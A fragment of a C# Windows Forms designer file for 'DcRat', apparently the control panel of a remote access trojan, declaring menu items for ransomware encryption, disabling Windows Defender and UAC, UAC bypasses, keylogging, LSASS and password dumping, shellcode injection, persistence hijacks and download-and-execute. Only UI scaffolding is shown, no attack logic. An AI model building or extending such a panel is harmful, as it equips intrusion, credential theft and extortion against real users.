            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "DcRat";
            this.Activated += new System.EventHandler(this.Form1_Activated);
            this.Deactivate += new System.EventHandler(this.Form1_Deactivate);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.contextMenuClient.ResumeLayout(false);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.contextMenuLogs.ResumeLayout(false);
            this.contextMenuThumbnail.ResumeLayout(false);
            this.contextMenuTasks.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).EndInit();
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.splitContainer1.Panel1.ResumeLayout(false);
            this.splitContainer1.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).EndInit();
            this.splitContainer1.ResumeLayout(false);
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.tabPage4.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;
        private System.Windows.Forms.Timer ping;
        private System.Windows.Forms.Timer UpdateUI;
        private System.Diagnostics.PerformanceCounter performanceCounter1;
        private System.Diagnostics.PerformanceCounter performanceCounter2;
        private System.Windows.Forms.ContextMenuStrip contextMenuThumbnail;
        private System.Windows.Forms.ToolStripMenuItem sTARTToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sTOPToolStripMenuItem;
        public System.Windows.Forms.ImageList ThumbnailImageList;
        public System.Windows.Forms.NotifyIcon notifyIcon1;
        private System.Windows.Forms.ContextMenuStrip contextMenuTasks;
        private System.Windows.Forms.ToolStripMenuItem downloadAndExecuteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem uPDATEToolStripMenuItem1;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator4;
        private System.Windows.Forms.ToolStripMenuItem dELETETASKToolStripMenuItem;
        private System.Windows.Forms.Timer TimerTask;
        private System.Windows.Forms.ContextMenuStrip contextMenuLogs;
        private System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem;
        private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2;
        private System.Windows.Forms.MenuStrip menuStrip1;
        private System.Windows.Forms.ContextMenuStrip contextMenuClient;
        private System.Windows.Forms.ToolStripMenuItem RemoteManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RemoteShellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RemoteScreenToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RemoteControlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem SendFileToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem SendFileToDiskToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem SendFileToMemoryToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem VisteWebsiteToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem SystemControlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem ClientControlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem StopToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem RestartToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem UpdateToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem UninstallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem ClientFolderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem SystemToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem ShutDownToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RebootToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem LogoutToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem BypassUACAToolStripMenuItem;
        private System.Windows.Forms.SplitContainer splitContainer1;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        public System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ColumnHeader lv_ip;
        private System.Windows.Forms.ColumnHeader lv_country;
        public System.Windows.Forms.ColumnHeader lv_hwid;
        private System.Windows.Forms.ColumnHeader lv_user;
        private System.Windows.Forms.ColumnHeader lv_os;
        private System.Windows.Forms.ColumnHeader lv_version;
        private System.Windows.Forms.ColumnHeader lv_ins;
        private System.Windows.Forms.ColumnHeader lv_admin;
        private System.Windows.Forms.ColumnHeader lv_av;
        public System.Windows.Forms.ColumnHeader lv_ping;
        public System.Windows.Forms.ColumnHeader lv_act;
        private System.Windows.Forms.TabPage tabPage3;
        public System.Windows.Forms.ListView listView3;
        private System.Windows.Forms.TabPage tabPage4;
        public System.Windows.Forms.ListView listView4;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ColumnHeader columnHeader5;
        public System.Windows.Forms.ListView listView2;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ToolStripMenuItem FileSearchToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader lv_group;
        private System.Windows.Forms.ToolStripMenuItem MalwareToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RansomwareToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem EncryptToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem DecryptToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem DisableWDToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem SilentCleanupToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem RunasToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem FodhelperToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem DisableUACToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem CompMgmtLauncherToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem autoKeyloggerToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader lv_camera;
        private System.Windows.Forms.ToolStripMenuItem fakeBinderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sendFileFromUrlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem installSchtaskToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disableUACToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem disableWDToolStripMenuItem1;
        private System.Windows.Forms.Timer ConnectTimeout;
        private System.Windows.Forms.ToolStripMenuItem persistenceToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem userAddToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remotePowershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem shellcodeInjectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem winlogonHelperToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem hijackDefaultExtToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem hijackScrnSaverToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem wMIBackdoorToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem rdpThiefToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem3;
        private System.Windows.Forms.ToolStripMenuItem schtaskToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem installToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem startUpToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem installToolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem2;
        private System.Windows.Forms.ToolStripMenuItem credentialsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem dumpLsassToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem logonPasswordsToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem otherPasswordsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem dumpWcmToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteCameraToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem processManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem regeditToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem recordToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem reconToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sysinfoToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem netstatToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem programNotificationToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem3;
        private System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem4;
        private System.Windows.Forms.ToolStripMenuItem builderToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem blockToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem settingToolStripMenuItem1;
    }
}

